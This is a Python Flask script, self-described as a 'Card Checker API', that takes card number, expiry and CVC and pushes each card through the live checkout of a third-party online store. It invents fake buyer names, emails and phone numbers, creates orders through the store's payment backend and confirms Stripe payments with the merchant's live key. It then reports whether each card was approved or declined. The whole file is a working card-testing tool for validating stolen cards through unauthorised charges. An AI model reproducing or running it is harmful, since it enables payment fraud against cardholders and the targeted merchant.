
from flask import Flask, request, jsonify
import requests
import random
import string
import json
import time
import uuid

app = Flask(__name__)

def random_email():
    return f"{''.join(random.choices(string.ascii_lowercase, k=10))}@gmail.com"

def random_phone():
    return f"+91{random.randint(7000000000, 9999999999)}"

def random_name():
    first_names = ['Raj', 'Amit', 'Priya', 'Neha', 'Vikram', 'Simran', 'Rahul', 'Anjali']
    last_names = ['Sharma', 'Verma', 'Patel', 'Kumar', 'Singh', 'Gupta']
    return f"{random.choice(first_names)} {random.choice(last_names)}"

LOCATION_ID = "aIfbkdsjbDMNd2jXVzkv"

@app.route('/strip1', methods=['GET'])
def check_card():
    try:
        card_input = request.args.get('cc')
        
        if not card_input:
            return jsonify({
                "status": "error",
                "message": "Missing cc parameter. Format: ?cc=number|MM|YY|CVC"
            }), 400
        
        parts = card_input.split('|')
        if len(parts) != 4:
            return jsonify({
                "status": "error", 
                "message": "Invalid format. Use: number|MM|YY|CVC"
            }), 400
        
        card_number, exp_month, exp_year, cvc = parts
        
        name = random_name()
        email = random_email()
        phone = random_phone()
        fingerprint = str(uuid.uuid4())
        tracking_id = str(uuid.uuid4())
        
        print(f"\n{'='*50}")
        print(f"📧 Email: {email}")
        print(f"👤 Name: {name}")
        print(f"💳 Card: {card_number[:4]}****{card_number[-4:]}")
        print(f"{'='*50}\n")
        
        # ========== CREATE ORDER ==========
        headers1 = {
            'accept': 'application/json',
            'channel': 'APP',
            'content-type': 'application/json',
            'fullurl': 'https://gospelpianosimple.com/checkout',
            'origin': 'https://gospelpianosimple.com',
            'referer': 'https://gospelpianosimple.com/',
            'source': 'WEB_USER',
            'timezone': 'Asia/Calcutta',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) Chrome/127.0.0.1 Mobile',
        }
        
        json1 = {
            'altId': LOCATION_ID,
            'altType': 'location',
            'contactId': 'aGbXD3iQFPAAOW87eaTO',  # Fixed contact ID
            'source': {
                'type': 'funnel',
                'subType': 'one_step_order_form',
                'id': 'g4nSqj6sq4cLxVKmvzp7',
                'name': 'Gospel Piano, Made Simple (Funnel)',
                'meta': {
                    'stepId': '0b7fe1a4-7b0e-4737-b368-d33360a23d2f',
                    'pageId': 't9fsSH8BSKlN7gCRtdOC',
                    'domain': 'gospelpianosimple.com',
                    'pageUrl': '/checkout',
                    'affiliateManager': {}
                }
            },
            'products': [{'id': '698502efdd3a3371f5ffba3f', 'qty': 1}],
            'fingerprint': fingerprint,
            'trackingId': tracking_id,
            'traceId': ''
        }
        
        print("🔄 Creating order...")
        r1 = requests.post('https://backend.leadconnectorhq.com/payments/orders', 
                           headers=headers1, json=json1, timeout=15)
        
        if r1.status_code not in [200, 201]:
            return jsonify({
                "status": "error",
                "message": f"Order creation failed: {r1.status_code}",
                "response": r1.text
            }), 500
        
        order_data = r1.json()
        # FIXED: Use '_id' instead of 'id'
        order_id = order_data.get('order', {}).get('_id')
        
        if not order_id:
            return jsonify({
                "status": "error",
                "message": "No order ID received",
                "response": order_data
            }), 500
        
        print(f"✅ Order ID: {order_id}")
        
        # ========== INITIATE PAYMENT ==========
        headers2 = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'fullurl': 'https://gospelpianosimple.com/checkout',
            'origin': 'https://gospelpianosimple.com',
            'referer': 'https://gospelpianosimple.com/',
            'timezone': 'Asia/Calcutta',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) Chrome/127.0.0.1 Mobile',
        }
        
        json2 = {
            'altId': LOCATION_ID,
            'altType': 'location',
            'orderId': order_id,
            'paymentMethodConfiguration': 'pmc_1QwcLrFpU9DlKp7Rl9zb07x1',
            'mode': 'subscription',
            'defaultPMConfigForFutureUsage': True,
            'giftCardCode': ''
        }
        
        print("🔄 Initiating payment...")
        r2 = requests.post('https://backend.leadconnectorhq.com/payments/stripe/initiate', 
                           headers=headers2, json=json2, timeout=15)
        
        if r2.status_code not in [200, 201]:
            return jsonify({
                "status": "error",
                "message": f"Payment initiation failed: {r2.status_code}",
                "response": r2.text
            }), 500
        
        data2 = r2.json()
        payment_intent_id = data2.get('paymentIntentId')
        client_secret = data2.get('clientSecret')
        
        if not payment_intent_id:
            return jsonify({
                "status": "error",
                "message": "No payment intent ID received"
            }), 500
        
        print(f"✅ Payment Intent: {payment_intent_id}")
        
        # ========== CONFIRM PAYMENT WITH CARD ==========
        card_spaced = ' '.join([card_number[i:i+4] for i in range(0, len(card_number), 4)])
        
        data3 = f'return_url=https%3A%2F%2Fgospelpianosimple.com%2Fverify-payment-callback%3FsourceId%3D{order_id}%26altId%3D{LOCATION_ID}&payment_method_data[type]=card&payment_method_data[card][number]={card_spaced}&payment_method_data[card][cvc]={cvc}&payment_method_data[card][exp_year]={exp_year}&payment_method_data[card][exp_month]={exp_month}&payment_method_data[billing_details][address][country]=IN&use_stripe_sdk=true&key=pk_live_MtxwO3obi7pfD7UZlGkfR2yj&_stripe_account=acct_1FKMKtHGUqx8Rh4c&client_secret={client_secret}'
        
        headers3 = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) Chrome/127.0.0.1 Mobile',
        }
        
        url3 = f'https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm'
        
        print("💳 Processing card...")
        r3 = requests.post(url3, headers=headers3, data=data3, timeout=15)
        result = r3.json()
        
        # ========== CHECK RESULT ==========
        if result.get('status') == 'succeeded':
            response_data = {
                "status": "approved",
                "message": "✅ PAYMENT APPROVED!",
                "order_id": order_id,
                "email": email,
                "card": f"{card_number[:4]}****{card_number[-4:]}",
                "amount": "$10.00"
            }
            print("✅✅✅ APPROVED! Payment successful!")
            
        elif result.get('error'):
            err = result['error']
            code = err.get('decline_code', err.get('code', 'declined')).upper()
            msg = err.get('message', '')
            
            response_data = {
                "status": "declined",
                "message": f"❌ DECLINED - {code}",
                "details": msg,
                "order_id": order_id,
                "email": email,
                "card": f"{card_number[:4]}****{card_number[-4:]}"
            }
            print(f"❌ DECLINED: {code} - {msg}")
            
        else:
            response_data = {
                "status": "unknown",
                "message": f"⚠️ {result.get('status', 'unknown')}",
                "order_id": order_id,
                "email": email
            }
        
        return jsonify(response_data), 200
        
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": str(e)
        }), 500

if __name__ == '__main__':
    print("🚀 Card Checker API Starting...")
    print("📍 http://localhost:5000/strip1?cc=card|MM|YY|CVC")
    app.run(debug=True, host='0.0.0.0', port=5000)
